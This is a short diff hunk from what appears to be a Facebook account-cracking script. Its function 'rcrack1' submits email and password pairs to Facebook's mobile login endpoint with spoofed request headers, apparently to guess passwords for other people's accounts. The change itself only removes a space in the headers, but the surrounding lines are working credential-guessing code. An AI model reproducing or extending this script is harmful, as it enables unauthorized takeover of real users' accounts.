@@ -218,7 +218,7 @@ def rcrack1(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            headers = {'authority': 'p.facebook.com',
+            headers = {'authority':'p.facebook.com',
             'method': 'POST',
             'scheme': 'https',
             'path': '/login/device-based/login/async/?refsrc=deprecated&lwv=100',
